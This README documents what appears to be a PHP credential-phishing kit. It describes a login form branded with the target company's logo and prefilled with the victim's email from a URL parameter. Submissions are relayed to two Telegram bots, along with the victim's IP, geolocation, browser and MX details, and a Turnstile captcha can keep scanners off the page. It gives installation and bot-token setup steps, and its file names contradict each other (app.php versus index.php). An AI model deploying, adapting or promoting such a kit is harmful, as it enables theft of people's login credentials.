# PHP Version - NewSeason Authentication Form (Separated Frontend/Backend)

This is an exact PHP conversion of the Flask application with separated frontend and backend files, just like the Flask version.

## File Structure

```
php-version/
├── app.php         # Backend logic (equivalent to app.py)
├── he-opas.php     # Frontend template (equivalent to he-opas.html)
├── .htaccess       # Apache configuration
└── README.md       # This documentation
```

## Features

- ✅ **Separated Architecture** - Backend (app.php) and Frontend (he-opas.php)
- ✅ **Responsive Login Form** with Bootstrap 5 styling
- 🔒 **Cloudflare Turnstile** captcha integration
- 🏢 **Clearbit Logo API** for company branding
- 📱 **Dual Telegram Bot** notifications
- 🌍 **Enhanced User Tracking**:
  - Real IP detection (proxy-aware)
  - Geolocation (city/country)
  - Browser detection
  - MX record lookup
  - Timestamp logging

## Architecture

### Backend (app.php)
- Handles all business logic
- Processes form submissions
- Manages Telegram integration
- Includes the frontend template
- Equivalent to Flask's `app.py`

### Frontend (he-opas.php)
- Pure presentation layer
- HTML template with PHP variables
- Handles client-side validation
- Equivalent to Flask's `he-opas.html` template

## Installation & Usage

1. **Upload files** to your web server directory
2. **Visit the application**:
   - Direct access: `yoursite.com/php-version/`
   - With email: `yoursite.com/php-version/?email=user@domain.com`
3. **Form submission** goes to `app.php` via form action

## Configuration

### Telegram Bots
Edit the constants in `index.php`:

```php
// Main Bot (always active)
const TELEGRAM_BOT_TOKEN = 'your-main-bot-token';
const TELEGRAM_CHAT_ID = 'your-main-chat-id';

// Secondary Bot (comment out to disable)
const SECONDARY_TELEGRAM_BOT_TOKEN = 'your-secondary-bot-token';
const SECONDARY_TELEGRAM_CHAT_ID = 'your-secondary-chat-id';
```

### Cloudflare Turnstile
Update the secret key in `index.php`:
```php
const TURNSTILE_SECRET = 'your-turnstile-secret-key';
```

## Usage

1. **Direct Access**: Visit `yoursite.com/php-version/`
2. **With Email Parameter**: `yoursite.com/php-version/?email=user@domain.com`
3. **Form Processing**: Same form handles GET (display) and POST (processing)

## Web Server Configuration

### Apache
The included `.htaccess` handles URL rewriting and security headers.

### Nginx
Add this to your server block:
```nginx
location /php-version/ {
    try_files $uri $uri/ /php-version/index.php?$query_string;
    
    # Security headers
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
}
```

## Differences from Flask Version

- **Single File**: All logic in `index.php` instead of separate template
- **Error Handling**: PHP-style error handling and logging
- **Session Management**: Uses PHP superglobals instead of Flask request object
- **Built-in Functions**: Uses PHP's native functions for HTTP requests and JSON

## Security Features

- Input sanitization with `htmlspecialchars()`
- CSRF protection via Turnstile
- Security headers via `.htaccess`
- File access restrictions

## Troubleshooting

### Common Issues:
1. **500 Error**: Check PHP error logs, ensure all extensions are enabled
2. **Turnstile Not Working**: Verify site key and secret key match
3. **Telegram Not Sending**: Check bot tokens and chat IDs
4. **IP Detection Issues**: Ensure proxy headers are configured in web server

### Debug Mode:
Add this to the top of `index.php` for debugging:
```php
error_reporting(E_ALL);
ini_set('display_errors', 1);
```

## Production Deployment

1. **Disable debug mode**
2. **Set appropriate file permissions**
3. **Configure HTTPS/SSL**
4. **Set up log rotation**
5. **Monitor error logs**

This PHP version provides identical functionality to the Flask app with native PHP performance and easier deployment on shared hosting.
